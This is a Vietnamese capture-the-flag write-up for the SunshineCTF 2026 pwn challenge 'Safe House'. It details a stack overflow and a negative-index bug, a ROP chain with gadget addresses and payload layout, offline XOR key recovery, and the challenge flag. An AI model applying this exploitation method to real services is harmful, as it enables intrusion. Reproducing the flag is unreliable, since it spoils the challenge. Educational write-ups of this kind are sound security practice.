---
title: "Safe House — Pwn (Hard)"
date: 2026-09-28 16:53:17 +0700
lastmod_at: 2026-09-28 16:53:17 +0700
categories: [Pwn]
tags: [sunshinectf, Pwn]
image:
  path: /CTFWU/SunshineCTF%202026/safe-house/files/de.png
---
{% raw %}
**Flag:** `sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}` · tác giả Oreomeister
**Target:** `nc chal.sunshinectf.games 26007` · **Files:** `service` (18504 B, sha256 `40c8993c1a853f62...`)

## Đề bài

"Safe house nhận báo cáo và lưu note cho thực địa. Vượt qua quầy lễ tân để vào hầm." Một cờ duy nhất.

## Phân tích ban đầu

ELF x86-64, no PIE, NX, không canary ở các hàm đi vào chuỗi ROP, GNU_RELRO phủ hết `.got` (GOT không ghi được), stripped. Dịch vụ là hai tiến trình nói chuyện qua một socketpair; chỉ tiến trình cha nhận input từ ta.

## Kiến trúc

`main @ 0x401290`:

1. `socketpair(AF_UNIX, SOCK_STREAM, 0, sv)`.
2. `key = prng(getpid())` (hằng số `0x45d9f3b`, hai bước xor-shift) ghi tại `0x405060`. Đó là khoá XOR của mọi message cha↔con, khác nhau ở mỗi kết nối nhưng cố định trong một tiến trình.
3. `fork()`:
   - Cha = front desk: `dup2(sv[0], 3)`, cài seccomp (`PR_SET_NO_NEW_PRIVS` + `seccomp(2)`, 21 lệnh BPF), rồi vòng lệnh đọc từng byte từ stdin tới `\n` vào buffer 1024 byte, so khớp 4 byte: `PING HELP NOTE RELAY SUBMIT QUIT`.
   - Con = vault: `dup2(sv[1], 3)`; `open("/dev/null")` rồi `dup2` vào fd 0 và 1; `signal(SIGPIPE, SIG_IGN)`; `open("flag.txt")` và lưu `{state=2, fd}` vào bảng tại `0x405080`, mỗi phần tử 0x40c byte; các phần tử sau trỏ `/dev/null`. Vault không có seccomp.
4. `0x401be0(buf, len, edx=key)` = XOR với 4 byte key theo thứ tự big-endian, lặp chu kỳ 4.
5. `0x401d50(edi=kênh, rsi=data, edx=len)` = dựng header `[kênh][len_be16][0]`, XOR, `write(3, header, 4)`, rồi copy/XOR/`write(3, payload, len)`. Hàm này dùng được ở cả hai phía vì nó chỉ đụng fd 3.

Lệnh front desk: `NOTE <0..7> <text>` (bảng tại `0x40a180`, mỗi phần tử 0x40, `strncpy` tối đa 0x3f), `RELAY <1..4>` → `0x401f70`, `SUBMIT <size>` → `0x401ed0`.

AF_UNIX `SOCK_STREAM` là dòng byte thuần, không giữ ranh giới record, nên `read(3, buf, n)` lấy được cả header lẫn payload của câu trả lời.

## Hai lỗ hổng

**1. Tràn stack ở front desk (`0x401ed0`, handler `SUBMIT`)**

```
strtol(size); bl = size & 0xff
if (bl) { write(1,"GO\n",3); read(0, rsp, bl); write(1,"OK\n",3); }
add rsp,0x40; pop rbx; ret
```

Frame `sub rsp,0x40` = 64 byte, return address ở offset 0x48, `read` nhận tới 255 byte, không canary.

**2. Index âm ở vault (`0x4019c0`, op 3)**

```
if (len <= 3) -> "short"
idx = *(int32*)data            // movsxd, CÓ DẤU
if (idx > 15) -> "range"       // chỉ chặn cận trên
e = 0x4060b0 + idx*0x40c
if (e.state == 2) { pread(e.fd, buf, 0x400, 0); trả kết quả về fd 3 }
```

`0x4060b0` chính là phần tử thứ 4 của bảng fd, nên `idx = -4` trỏ đúng `0x405080` = fd của `flag.txt`.

## Các hướng đã loại

1. Đặt code trên stack rồi nhảy vào. NX bật.
2. Ghi GOT đổi hướng gọi. GNU_RELRO ở binary này phủ hết `.got`, không có slot nào ghi được.
3. ROP chuỗi cần `pop rdx`. Quét sạch `.text` chỉ ra `pop rdi; ret @ 0x401529` và `pop rsi; ret @ 0x401e5f`; không có `pop rdx`, không có `syscall`, không có `jmp/call rsp`.
4. `rdx` khi ret khỏi SUBMIT bằng `size`. Không. Lệnh `write(1,"OK\n",3)` chạy *sau* `read` và để lại `edx = 3`. Bằng chứng: ba lần chạy đầu chỉ rút được 3 byte/vòng, và request `op=3` (yêu cầu `len > 3`) luôn bị vault trả về `"short"`. Phải tìm chỗ khác đặt `rdx`.

## Chuỗi khai thác

**Bước 1 - gadget nằm ở nhánh lỗi.** Nếu `size & 0xff == 0`, handler in `"ERR bad size\n"` (`mov edx,0xd`) rồi ret, không đi qua `read` và không qua `OK\n` → `rdx = 13` khi ret. Chuỗi `"256"` đặt trong NOTE cho đúng `bl = 0`.

**Bước 2 - đặt trước dữ liệu.** `NOTE 0 = int32(-4)` (không chứa byte 0 nên `strncpy` copy đủ), `NOTE 3 = "256"`.

**Bước 3 - chuỗi ROP.** Mỗi vòng là một `SUBMIT 255` với payload đúng 255 byte (`bl` vừa là `rdx` vừa là số byte `read` ăn vào payload, nên payload phải đúng bằng `bl`):

```
pad(0x48)
pop rdi -> NOTE3("256") ; 0x401ed0                 # rdx = 13
[vòng đầu] pop rdi=3 ; pop rsi=NOTE0 ; 0x401d50    # gửi op=3, len=13, data=int32(-4)
pop rdi=3 ; pop rsi=REPLY ; read@plt               # read(3, REPLY, 13)
pop rdi=1 ; pop rsi=REPLY ; write@plt              # write(1, REPLY, 13) -> dump ra socket của ta
0x4014d0                                           # quay lại prompt
```

Vòng 1 rút 13 byte, các vòng sau rút tiếp; 4 vòng là đủ cho header 4 + payload 40 byte.

**Bước 4 - giải mã offline.** Header plaintext = `[00][L>>8][L&0xff][00]`, nên với mỗi offset và mỗi `L` thử được `key = ct ^ plaintext_suy_đoán`, rồi decrypt phần còn lại và tìm `sun{`. Không cần biết PID.

```
$ python -u exploit4.py -4
[+] key=23b2f0a0  L=40
[+] b'sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}\n'
[+] CO: sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}
```

**Bước 5 - Kiểm chứng.** Đã chạy lại 3 lần với 3 kết nối khác nhau, 3 key hoàn toàn khác nhau, cùng một cờ.

## Flag
```
sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}
```

{% endraw %}
